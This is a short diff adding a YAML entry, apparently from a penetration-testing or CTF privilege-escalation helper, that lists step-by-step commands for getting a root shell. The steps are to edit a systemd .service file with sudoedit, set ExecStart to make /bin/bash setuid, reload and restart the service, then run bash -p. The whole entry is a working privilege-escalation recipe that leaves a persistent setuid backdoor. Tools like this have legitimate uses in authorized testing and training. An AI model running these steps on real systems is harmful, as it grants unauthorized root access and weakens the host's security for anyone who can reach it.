@@ -1,0 +1,14 @@
+description: editting .service file with high privilege, then run it to get root shell
+function: magic_function
+argument: []
+In: []
+condition:
+Out: []
+hint:
+  - "[INPUT]service_file_name"
+  - enter `sudoedit /path_to_the_file/{Data['service_file_name']}`
+  - modify the [Service] part to \n`Type=oneshot\nExecStart=/bin/sh -c "chmod +s /bin/bash"`\nthen save the file
+  - run `sudo systemctl daemon-reload`
+  - run `sudo systemctl restart {Data['service_file_name']}`
+  - run `/bin/bash -p`
+  - enter `id` to see if you get root(y/N)
